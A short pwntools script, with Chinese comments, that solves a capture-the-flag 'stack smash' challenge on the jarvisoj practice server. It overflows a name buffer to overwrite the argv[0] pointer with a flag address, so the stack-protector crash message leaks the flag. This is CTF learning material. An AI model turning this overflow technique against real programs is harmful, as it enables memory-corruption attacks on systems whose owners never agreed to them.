#coding=utf-8
# 原理 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/#stack-smash
from pwn import *
sh = remote("pwn.jarvisoj.com", 9877)

# argv与name可能有出入, 但他们的偏移一定相同
# 本地环境有可能无法正确输出, 但连服务器能正确输出
argv_addr = 0x00007fffffffdc58
name_addr = 0x7fffffffda40
another_flag_addr = 0x400d20
payload = 'a' * (argv_addr - name_addr) + p64(another_flag_addr)
sh.recvuntil('name? ')
sh.sendline(payload)
sh.recvuntil('flag: ')
sh.sendline('bb')
sh.interactive()
